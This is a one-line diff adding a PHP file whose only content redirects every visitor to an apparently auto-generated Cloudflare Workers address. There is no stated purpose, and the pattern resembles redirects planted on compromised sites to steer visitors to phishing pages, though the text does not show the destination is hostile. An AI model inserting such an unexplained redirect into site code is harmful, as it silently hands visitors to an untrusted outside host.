@@ -1,0 +1,1 @@
+<?php header("Location: https://summer-paper-1687.dmarce.workers.dev/"); ?>
